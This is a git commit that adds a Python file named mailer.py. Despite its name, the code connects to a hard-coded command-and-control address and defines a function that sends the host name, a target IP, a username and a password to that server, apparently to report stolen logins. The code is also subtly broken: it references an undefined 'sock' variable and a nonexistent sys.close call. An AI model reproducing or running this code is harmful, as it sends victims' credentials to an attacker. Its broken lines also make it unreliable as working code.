1aaeb3449f8d70154d2e3eff605bb639040f918e
Richard Payne <richardncpayne@gmail.com>
2017-08-06 21:59:00 +0100

    Add files via upload

---
+++ mailer.py
@@ -0,0 +1,20 @@
+import socket, sys
+
+C2 = "45.55.18.16"
+C2PORT = 8989
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.settimeout(10)
+s.connect((C2, C2PORT))
+
+def send(ip, usr, pw):
+    try:
+        try:
+            s.send(socket.gethostname() + " ---> " + ip + " " + usr + " " + pw)
+            print "sent"
+        except socket.error, ex:
+            print ex
+    except KeyboardInterrupt:
+        s.close()
+        sys.close()
